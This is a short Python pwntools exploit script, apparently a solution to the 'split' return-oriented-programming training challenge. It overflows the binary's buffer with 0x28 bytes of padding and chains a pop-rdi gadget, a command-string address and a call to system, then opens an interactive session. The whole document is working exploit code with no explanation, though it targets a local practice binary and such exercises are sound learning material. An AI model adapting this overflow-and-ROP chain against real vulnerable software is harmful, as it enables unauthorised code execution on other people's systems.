from pwn import *

exe = ELF("./split")

context.binary = exe

gdbscript = """
set follow-fork-mode child
"""

CMD = pack(0x601060)
POP_RDI = pack(0x4007c3)
SYSTEM = pack(0x40074b)

def conn():
    return process([exe.path])

def main():
    r = conn()
    r.sendline(b"a" * 0x28 + POP_RDI + CMD + SYSTEM)
    r.interactive()

if __name__ == "__main__":
    main()
